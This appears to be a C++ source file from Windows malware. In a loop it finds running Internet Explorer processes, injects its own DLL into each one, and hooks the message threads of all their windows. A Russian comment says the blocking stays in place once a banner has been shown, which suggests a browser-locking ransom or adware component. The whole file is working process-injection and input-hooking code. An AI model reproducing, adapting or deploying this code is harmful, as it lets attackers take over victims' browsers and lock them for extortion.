#include <windows.h>
#include <time.h>
#include <stdio.h>
#include <process.h>
#include <hash_map>
#include <hash_set>
#include <list>
#include <shlwapi.h>


#include "dprint.h"
#include "threading.h"
#include "procenum.h"
#include "msgfilter.h"
#include "getapi.h"
#include "inject.h"
#include "iemsghooker.h"
#include "banner.h"
#include "main.h"




typedef std::list<HWND> HwndList;

static bool IsCurrentProcessNotIE()
{
  return !IsCurrentProcessCorrespondToFilter(
    ProcessFilter_IE);
}

BOOL CALLBACK EnumChildFunction(
  __in  HWND hwnd,
  __in  LPARAM lParam
)
{
  HwndList* list = (HwndList*)lParam;
  DWORD pid = 0;
  DWORD th_id = 0;

	th_id = GetWindowThreadProcessId(hwnd, &pid);

  if (pid == GetCurrentProcessId())
  {
    //PP_DPRINTF(L"EnumChildFunction: IE wind: hwnd=0x%X pid=%d",
    //    hwnd, GetCurrentProcessId());
    list->push_back(hwnd);
  }

  return TRUE;
}

BOOL CALLBACK EnumTopWindowsFunction(
  __in  HWND hwnd,
  __in  LPARAM lParam
)
{
  HwndList* list = (HwndList*)lParam;

  DWORD pid = 0;
  DWORD th_id = 0;

	th_id = GetWindowThreadProcessId(hwnd, &pid);

  if (pid == GetCurrentProcessId())
  {
    //PP_DPRINTF(L"EnumTopWindowsFunction: IE wind: hwnd=0x%X pid=%d",
    //  hwnd, pid);
    list->push_back(hwnd);
  }
  
  return TRUE;
}

void SetHooksOnAllWindowsThreads()
{
  HwndList top_windows;

  EnumWindows(EnumTopWindowsFunction, (LPARAM)&top_windows);
  for (HwndList::const_iterator i = top_windows.begin(); i != top_windows.end(); i++)
  {
    HWND      top_wnd = *i;
    HwndList  childs;

    MsgFilter::Instance().SetWndThreadHookFilter(top_wnd);
    EnumChildWindows(top_wnd, EnumChildFunction, (LPARAM)&childs);

    for (HwndList::const_iterator i = childs.begin(); i != childs.end(); i++)
    {
      MsgFilter::Instance().SetWndThreadHookFilter(*i);
    }
  }
}

static unsigned __stdcall IeMsgFilterThread(void* p)
{
  PP_DPRINTF(L"IeMsgFilterThread: started");

  bool banner_was_started = false;
  while (true)
  {
    Sleep(100);

    // Логика:
    //   если процесс показа баннера хоть раз был запущен.
    //   то даже по причине завершения показа блокировка всё равно остается.
    if (!banner_was_started) 
    {
      banner_was_started = BannerStarted();  
    }

    SetHooksOnAllWindowsThreads();
  }

  _endthreadex(0);
  return 0; 
}


void TryInitIEFiltering()
{
  PP_DPRINTF(L"TryInitIEFiltering: started");

  PP_RETURNIF1( IsCurrentProcessNotIE() );

  unsigned th_id;
  HANDLE th = (HANDLE)_beginthreadex(NULL, 0, &IeMsgFilterThread, NULL, 0, &th_id);
  if (th) CloseHandle(th);
}


void WINAPI Export_StartIeMsgFilterInjecting(void* self_dll_body)
{
  PP_DPRINTF(L"Export_StartIeMsgFilterInjecting: started.");

  stdext::hash_set<DWORD> injected_pids;

  while (true)
  {
    DWORD pids[200];
    DWORD pid_count = 0;

    FilteredEnumProcesses(ProcessFilter_IE, pids, ARRAYSIZE(pids), &pid_count);
    for (DWORD i = 0; i < pid_count; i++)
    {
      DWORD pid = pids[i];

      if (injected_pids.find(pid) != injected_pids.end()) 
        continue;

      HANDLE p = OpenProcess(PROCESS_CREATE_THREAD | 
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | 
        PROCESS_VM_WRITE | PROCESS_VM_READ,
        false, pid);

      DWORD le = GetLastError();

      PP_DPRINTF(L"Opening IE process result pid=%d handle=0x%X le=%d",
        pid, p, le);

      PVOID r = InjectRemouteDll(p, self_dll_body, NULL, 0);
      if (r != NULL) injected_pids.insert(pid);
      if (p) CloseHandle(p);

      PP_DPRINTF(L"Dll injected result into IE: pid=%d res=0x%p",
        pid, r);
    }
    Sleep(1);
  }
}
